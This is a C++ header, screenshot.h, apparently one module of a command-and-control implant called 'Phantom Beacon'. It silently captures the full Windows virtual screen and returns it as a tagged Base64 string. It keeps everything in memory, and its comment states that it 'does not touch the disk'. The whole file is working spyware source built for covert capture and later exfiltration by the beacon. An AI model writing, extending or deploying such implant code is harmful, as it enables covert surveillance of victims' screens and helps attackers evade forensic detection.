#pragma once
// ============================================================================
//  screenshot.h — Phantom Beacon In-Memory Screenshot (Windows Only)
//  ──────────────────────────────────────────────────────────────────
//  Captures the screen and returns a Base64-encoded string.
//  Does not touch the disk.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <vector>
#include <string>
#include "crypto.h"

namespace screenshot {

inline std::string capture() {
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    std::vector<unsigned char> lpBits(dwBmpSize);

    GetDIBits(hScreen, hBitmap, 0, (UINT)bmp.bmHeight, lpBits.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfType = 0x4D42; // "BM"

    std::vector<unsigned char> result;
    result.insert(result.end(), (unsigned char*)&bmfHeader, (unsigned char*)&bmfHeader + sizeof(bmfHeader));
    result.insert(result.end(), (unsigned char*)&bi, (unsigned char*)&bi + sizeof(bi));
    result.insert(result.end(), lpBits.begin(), lpBits.end());

    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return "SCREENSHOT_B64:" + crypto::base64_encode(result);
}

} // namespace screenshot
#endif
